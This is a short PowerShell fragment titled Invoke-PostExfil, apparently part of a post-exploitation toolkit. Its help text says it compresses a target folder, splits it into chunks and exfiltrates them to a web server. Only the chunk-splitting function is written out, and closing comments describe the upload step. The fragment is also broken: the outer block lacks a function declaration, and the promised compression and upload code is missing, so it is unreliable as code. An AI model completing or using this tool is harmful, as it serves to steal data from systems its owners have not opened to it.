
Invoke-PostExfil {
  <#
  .SYNOPSIS

  Compresses a target folder, breaks it into chunks, and exfils
  the parts to a web server.

  .PARAMETER Folder

  Folder of files to exfil.

  .PARAMETER Server

  Server path to exfil to.

  #>

  function split($inFile,  $outPrefix, [Int32] $bufSize){

    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 1
    $barr = New-Object byte[] $bufSize

    while( $bytesRead = $stream.Read($barr,0,$bufsize)){
      $outFile = "$outPrefix$chunkNum"
      $ostream = [System.IO.File]::OpenWrite($outFile)
      $ostream.Write($barr,0,$bytesRead);
      $ostream.close();
      echo "wrote $outFile"
      $chunkNum += 1
    }
  }
}




# split file into chunks,
# upload to a specified exfil URI
